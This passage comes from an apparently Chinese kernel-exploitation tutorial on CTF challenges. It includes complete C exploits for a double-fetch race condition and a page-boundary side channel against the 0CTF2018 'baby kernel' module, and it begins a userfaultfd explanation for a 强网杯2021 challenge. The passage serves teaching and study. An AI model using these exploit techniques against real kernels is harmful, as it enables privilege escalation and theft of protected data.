ROPchain[ropchain_idx++] = user_sp + <span class="hljs-number">8</span>;<br>    ROPchain[ropchain_idx++] = user_ss;<br><br>    spray_skb(skb_queue, fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="四、Race-Condition条件竞争"><a href="#四、Race-Condition条件竞争" class="headerlink" title="四、Race Condition条件竞争"></a>四、Race Condition条件竞争</h1><p>大伙应该都听过这个名字，也就是利用了如今计算机领域常见的同步和互斥导致问题来进行攻击</p>
<h2 id="例题：0CTF2018-Final-baby-kernel"><a href="#例题：0CTF2018-Final-baby-kernel" class="headerlink" title="例题：0CTF2018 Final - baby kernel"></a>例题：0CTF2018 Final - baby kernel</h2><p>整个模块就实现了ioctl，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">baby_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp-5Ch] [rbp-5Ch]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp-58h] [rbp-58h]</span><br><br>  _fentry__(a1, a2);<br>  v5 = v2;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x6666</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1337</span><br>         &amp;&amp; !_chk_range_not_ok(v2, <span class="hljs-number">16LL</span>, *(__readgsqword(&amp;current_task) + <span class="hljs-number">0x1358</span>))<span class="hljs-comment">// check1:检查传递结构体的范围是否小于0x7ffff...</span><br>         &amp;&amp; !_chk_range_not_ok(*v5, *(v5 + <span class="hljs-number">8</span>), *(__readgsqword(&amp;current_task) + <span class="hljs-number">0x1358</span>))<span class="hljs-comment">// check2:检查结构体内容的范围是否小于0x7ffff...</span><br>         &amp;&amp; *(v5 + <span class="hljs-number">8</span>) == <span class="hljs-built_in">strlen</span>(flag) )         <span class="hljs-comment">// check3:检查长度是否等于flag</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(*v5 + i) != flag[i] )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">22LL</span>;<br>    &#125;<br>    printk(<span class="hljs-string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">14LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里可以看到他是首先给出了flag的地址，然后再与我们传入的数据结构进行比较，其中有三个check</p>
<ol>
<li>检查我们的传入数据结构是否位于用户态（这里的(&amp;current_task)+0x1358的值是可以通过动调知道）</li>
<li>检查我们传入数据结构指向的块是否位于用户态</li>
<li>检查指向块的长度是否位于用户态</li>
</ol>
<p>检查完毕后再来查看我们传入的块里面的数据是否等于flag值，如果等于则打印在内核输出当中<br>下面就是本次讲解的例题手法</p>
<h3 id="1-double-fetch"><a href="#1-double-fetch" class="headerlink" title="1.double fetch"></a>1.double fetch</h3><p>这里的doube fetch就是两次取的意思，我们可以知道，在内核检测数据的过程中，以及到达开始比较的过程当中，这一段缝隙对于人来说可能是十分短且可以忽略的地方，而对于程序来说那就不是这样了，我们可以充分利用这段间隙，在该地址通过检测的情况下再立刻修改他指向的值，这样就可以绕过检测，这里给出a3师傅的图</p>
<p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" srcset="/img/loading.gif" lazyload></p>
<p>这里值得注意的一点就是再我们使用<code>pthread</code>函数簇的时候，记得编译选项加上<code>-lpthread</code><br>我们的exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x30</span>] = <span class="hljs-string">&quot;peiwithhao&quot;</span>;<br><span class="hljs-type">int</span> competition_time = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> real_addr;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">void</span>* flag_addr;<br>  <span class="hljs-type">size_t</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">competition_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; competition_time ; i++)&#123;<br>      flag.flag_addr = real_addr;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, <span class="hljs-number">2</span>);<br>  ioctl(fd, <span class="hljs-number">0x6666</span>);<br>  system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>  <span class="hljs-type">int</span> addr_fd = open(<span class="hljs-string">&quot;/addr.txt&quot;</span>, <span class="hljs-number">0</span>);<br>  lseek(addr_fd, <span class="hljs-number">31</span>, SEEK_SET);<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">char</span>* temp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>  buf[read(addr_fd, buf, <span class="hljs-number">0x10</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;real_addr);<br>  PRINT_ADDR(<span class="hljs-string">&quot;flag&quot;</span>, real_addr);<br><br>  pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competition_thread, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competition_time ; i++)&#123;<br>      flag.flag_addr = buf;<br>      ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>    &#125;<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>    <span class="hljs-type">int</span> result_fd = open(<span class="hljs-string">&quot;/result.txt&quot;</span>, <span class="hljs-number">0</span>);<br>    read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))&#123;<br>      status = <span class="hljs-number">0</span>;<br>    &#125;<br><br>  &#125;<br>  pthread_cancel(compete_thread);<br>  info_log(<span class="hljs-string">&quot;finish&quot;</span>);<br>  system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="2-侧信道"><a href="#2-侧信道" class="headerlink" title="2. 侧信道"></a>2. 侧信道</h3><p>顾名思义，其就是使用一种完全偏离正常解题思路的一种攻击手段，譬如更加像物理黑客那样达成自己的目的，有的侧信道解法甚至使用到加解密判断中运行时长的差别来判断整体程序的运行。本题同样存在侧信道解法。</p>
<p>我们在上面都接触到，只有题目中传递到了正确的flag值我们才可以获取flag，但是就这么个检查flag的过程是一个字节一个字节检测的，所以说我们可以采用下面这个思路：</p>
<ol>
<li>我们每次传递一定长度的flag值，并逐位进行爆破</li>
<li>每次判断正确的办法也很简单，如果我们传递了错误的值，程序就会正常退出，如果我们传递正确的值该怎么办呢，这里给出解答，我们可以mmap出一页范围，然后将部分flag置于页末尾，那么如果我们flag的最后一个符号匹配，程序就会接着往后面访问判断是否匹配，但是这就到了下一页，其大概率会出现访问panic</li>
</ol>
<p>大致情况如下：</p>
<img src="/2023/06/24/Linux-Kernel-0x02-Practice/cxd.png" srcset="/img/loading.gif" lazyload class="">

<p>如下exp，我们可以通过传递参数的方式来猜：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">int</span> competition_time = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> real_addr;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">void</span>* flag_addr;<br>  <span class="hljs-type">size_t</span> flag_len;<br>&#125;flag = &#123;.flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">competition_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; competition_time ; i++)&#123;<br>      flag.flag_addr = real_addr;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span>&#123;<br><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;Usage: ./exp &lt;flag&gt;&quot;</span>);<br>  &#125;<br>  <span class="hljs-type">int</span> flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>  buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-type">void</span>* flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>  <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>  flag.flag_addr = flag_addr;<br>  ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="例题：强网杯2021线上赛-notebook"><a href="#例题：强网杯2021线上赛-notebook" class="headerlink" title="例题：强网杯2021线上赛-notebook"></a>例题：强网杯2021线上赛-notebook</h2><h3 id="1-userfaultfd基础"><a href="#1-userfaultfd基础" class="headerlink" title="1.userfaultfd基础"></a>1.userfaultfd基础</h3><p>该类技术就是让我们用户来处理本该由内核处理的事件，其中就比如缺页异常等。<br>userfaultfd 机制让在用户控制缺页处理提供可能，进程可以在用户空间为自己的程序定义page fault handler，增加了灵活性，但也可能由于类似FUSE之于内核FS的问题(调用层次加深)而影响性能。</p>
<p>他被实现一个系统调用供我们使用,我们可以查看其帮助手册，如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">SYNOPSIS<br>       #include &lt;sys/types.h&gt;<br>       #include &lt;linux/userfaultfd.h&gt;<br><br>       int userfaultfd(int flags);<br><br>       Note: There is no glibc wrapper for this system call; see NOTES.<br><br>DESCRIPTION<br>       userfaultfd() creates a new userfaultfd object that can be used for delegation of page-fault handling to a user-space application, and returns a file descriptor that refers to the new object.  The new userfaultfd ob‐<br>       ject is configured using ioctl(2).<br><br>       Once the userfaultfd object is configured, the application can use read(2) to receive userfaultfd notifications.  The reads from userfaultfd may be blocking or non-blocking, depending on the value of flags  used  for<br>       the creation of the userfaultfd or subsequent calls to fcntl(2).<br><br>       The following values may be bitwise ORed in flags to change the behavior of userfaultfd():<br><br>       O_CLOEXEC<br>              Enable the close-on-exec flag for the new userfaultfd file descriptor.  See the description of the O_CLOEXEC flag in open(2).<br><br>       O_NONBLOCK<br>              Enables non-blocking operation for the userfaultfd object.  See the description of the O_NONBLOCK flag in open(2).<br><br>       When the last file descriptor referring to a userfaultfd object is closed, all memory ranges that were registered with the object are unregistered and unread events are flushed.<br><br>   Usage<br>       The userfaultfd mechanism is designed to allow a thread in a multithreaded program to perform user-space paging for the other threads in the process.  When a page fault occurs for one of the regions registered to the<br>       userfaultfd object, the faulting thread is put to sleep and an event is generated that can be read via the userfaultfd file descriptor.  The fault-handling thread reads events from this file descriptor  and  services<br>       them using the operations described in ioctl_userfaultfd(2).  When servicing the page fault events, the fault-handling thread can trigger a wake-up for the sleeping thread.<br><br>       It  is  possible  for the faulting threads and the fault-handling threads to run in the context of different processes.  In this case, these threads may belong to different programs, and the program that executes the<br>       faulting threads will not necessarily cooperate with the program that handles the page faults.  In such non-cooperative mode, the process that monitors userfaultfd and handles page faults needs to  be  aware  of  the<br>       changes in the virtual memory layout of the faulting process to avoid memory corruption.<br><br>       Starting  from  Linux  4.11, userfaultfd can also notify the fault-handling threads about changes in the virtual memory layout of the faulting process.  In addition, if the faulting process invokes fork(2), the user‐<br>       faultfd objects associated with the parent may be duplicated into the child process and the userfaultfd monitor will be notified (via the UFFD_EVENT_FORK described below) about the file descriptor associated with the<br>       userfault  objects  created  for the child process, which allows the userfaultfd monitor to perform user-space paging for the child process.  Unlike page faults which have to be synchronous and require an explicit or<br>       implicit wakeup, all other events are delivered asynchronously and the non-cooperative process resumes execution as soon as the userfaultfd manager executes read(2).  The userfaultfd manager should carefully synchro‐<br>       nize calls to UFFDIO_COPY with the processing of events.<br><br></code></pre></td></tr></table></figure>

<p>userfaultfd()函数被使用来创建一个结构体，用作用户空间的缺页处理，并返回一个文件描述符，并且该结构体使用ioctl进行配置,配置过后我们就可以使用read函数读取其中的userfaultfd消息，该行为是否会被阻塞取决于创建uffd结构体时的flag值或连续的<code>fcntl</code>调用</p>
<p>我们要使用他，首先需要获得上面这样一个结构体，使用如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> uffd = syscall(_NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br></code></pre></td></tr></table></figure>

<p>获得这样一个结构体后，我们需要使用ioctl来进行之后的配置、注册内存区域、或者说是缺页处理，其中ioctl的命令参数如下：</p>
<ul>
<li>UFFDIO_REGESTER: 注册一个监视区域</li>
<li>UFFDIO_COPY: 上面的区域出现缺页后，使用该命令来像缺页的地址拷贝自定义数据</li>
</ul>
<p>然后我们需要使用mmap来映射出一片匿名区域，然后将其定义为监视区，再使用iotctl注册该区域</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 注册时要用一个struct uffdio_register结构传递注册信息:</span><br><span class="hljs-comment">// struct uffdio_range &#123;</span><br><span class="hljs-comment">// __u64 start;    /* Start of range */</span><br><span class="hljs-comment">// __u64 len;      /* Length of range (bytes) */</span><br><span class="hljs-comment">// &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// struct uffdio_register &#123;</span><br><span class="hljs-comment">// struct uffdio_range range;</span><br><span class="hljs-comment">// __u64 mode;     /* Desired mode of operation (input) */</span><br><span class="hljs-comment">// __u64 ioctls;   /* Available ioctl() operations (output) */</span><br><span class="hljs-comment">// &#125;;</span><br><br>   <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">      demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">      actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">      the userfaultfd. */</span><br><br><br>addr = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>)<br><span class="hljs-comment">// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_register</span><br>uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>uffdio_register.range.len = len;<br><span class="hljs-comment">// mode 只支持 UFFDIO_REGISTER_MODE_MISSING</span><br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-comment">// 用ioctl的UFFDIO_REGISTER注册</span><br>ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);<br><br></code></pre></td></tr></table></figure>

<p>然后我们就需要启动一个线程进行轮询，来捕获对于我们该页的异常</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 主进程中调用pthread_create创建一个fault handler线程</span><br>pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br><br></code></pre></td></tr></table></figure>

<blockquote>
<p>一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。</p>
</blockquote>
<p>上面一段是我引用Jcix师傅的原话，侵删~~</p>
<p>下面就是我们的<code>fault_handler_thread</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 